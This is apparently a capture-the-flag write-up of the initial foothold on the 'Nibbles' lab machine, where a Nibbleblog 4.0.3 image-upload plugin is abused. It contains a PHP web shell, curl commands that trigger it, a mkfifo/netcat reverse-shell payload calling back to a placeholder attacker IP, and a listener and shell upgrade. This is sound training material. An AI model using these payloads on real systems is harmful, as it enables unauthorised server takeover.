# Nibbles - Initial Foothold

## Steps to Gain Initial Foothold
1. **Admin Portal Enumeration:**
   - Key Pages:
     - `Publish`: For creating posts/pages.
     - `Manage`: Manage categories, not very interesting.
     - `Themes`: Install pre-selected themes.
     - `Plugins`: Configure and install plugins (notably the "My image" plugin for file uploads).
     - `Settings`: Confirmed version 4.0.3 of Nibbleblog in use.

2. **Exploiting "My Image" Plugin:**
   - Uploaded a PHP file containing:
     ```php
     <?php system('id'); ?>
     ```
   - Upload errors confirmed that the file was saved but not processed correctly.
   - Found the uploaded file at: `/nibbleblog/content/private/plugins/my_image/image.php`.

3. **Remote Code Execution (RCE):**
   - Verified RCE by curling the uploaded PHP file:
     ```bash
     curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
     ```
   - Result:
     ```
     uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
     ```

4. **Reverse Shell Upload:**
   - Modified PHP script with a reverse shell payload:
     ```php
     <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT> >/tmp/f"); ?>
     ```
   - Uploaded the file and executed it via:
     ```bash
     curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
     ```

5. **Netcat Listener:**
   - Set up a listener to catch the reverse shell:
     ```bash
     nc -lvnp 9443
     ```
   - Shell obtained:
     ```
     /bin/sh: 0: can't access tty; job control turned off
     $ id
     uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
     ```

6. **Upgrading Shell:**
   - Python2 was unavailable, so upgraded the shell using Python3:
     ```bash
     python3 -c 'import pty; pty.spawn("/bin/bash")'
     ```

## Post-Exploitation
- **User Directory Contents:**
  - Found `user.txt` flag and `personal.zip` file in `/home/nibbler`.

## Key Learnings
1. Exploiting upload vulnerabilities can lead to RCE if improperly sanitized.
2. Reverse shells are a crucial step in gaining interactive server access.
3. Upgrading to a fully interactive TTY makes further exploration smoother.
